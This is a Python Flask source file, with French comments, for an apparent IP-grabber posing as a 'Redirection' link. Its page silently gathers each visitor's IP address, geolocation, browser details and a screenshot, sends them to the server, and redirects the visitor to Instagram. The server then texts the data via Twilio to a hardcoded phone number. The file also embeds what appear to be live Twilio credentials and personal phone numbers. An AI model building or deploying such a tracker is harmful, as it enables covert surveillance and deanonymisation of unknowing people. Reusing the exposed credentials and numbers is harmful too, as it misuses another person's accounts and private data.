from flask import Flask, request, jsonify
from twilio.rest import Client
import requests
import os

app = Flask(__name__)

# Configuration Twilio
account_sid = os.getenv('AC2ef2bd5bd5146f76f586d2c577159f90') or 'AC2ef2bd5bd5146f76f586d2c577159f90'
auth_token = os.getenv('5ce2eed95742af1667bb5c8b8528cf0c') or '5ce2eed95742af1667bb5c8b8528cf0c'
from_number = os.getenv('+12524866318') or '+12524866318'
to_number = os.getenv('+33635960569') or '+33635960569'

client = Client(account_sid, auth_token)

# Fonction d'envoi SMS

def send_sms(message_body):
    try:
        message = client.messages.create(
            body=message_body,
            from_=from_number,
            to=to_number
        )
        print(f"[+] SMS envoyé : {message.sid}")
    except Exception as e:
        print(f"[!] Erreur envoi SMS : {e}")

@app.route('/')
def index():
    return '''
    <html>
    <head><title>Redirection</title></head>
    <body>
        <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
        <script>
            async function collectData() {
                const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
                const locationData = await fetch('https://ipapi.co/' + ipData.ip + '/json/').then(r => r.json());
                const screenshot = await html2canvas(document.body).then(canvas => canvas.toDataURL());

                const data = {
                    ip: ipData.ip,
                    ua: navigator.userAgent,
                    screen: screenshot,
                    lang: navigator.language,
                    platform: navigator.platform,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    location: locationData
                };

                await fetch('/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });

                window.location.href = "https://www.instagram.com";
            }

            collectData();
        </script>
    </body>
    </html>
    '''

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    ip = data.get('ip')
    ua = data.get('ua')
    lang = data.get('lang')
    platform = data.get('platform')
    timezone = data.get('timezone')
    location = data.get('location', {})

    # Préparation du message
    message_body = f"""
    Nouvelle visite !
    IP: {ip}
    User-Agent: {ua}
    Langue: {lang}
    Plateforme: {platform}
    Fuseau: {timezone}
    Pays: {location.get('country_name')}, Ville: {location.get('city')}
    FAI: {location.get('org')}
    """

    send_sms(message_body)
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
